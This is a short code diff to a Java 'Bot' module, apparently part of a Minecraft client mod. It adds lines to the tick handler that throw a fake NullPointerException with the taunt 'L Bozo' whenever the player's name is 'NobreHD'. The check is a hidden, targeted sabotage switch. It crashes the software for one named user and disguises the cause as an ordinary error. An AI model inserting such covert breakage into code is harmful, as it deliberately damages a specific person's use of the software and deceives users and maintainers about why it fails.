@@ -163,6 +163,11 @@ public class Bot extends Module {
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
+
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
+
         if (Chat.get()) {
 
             if (messages.get().isEmpty()) return;
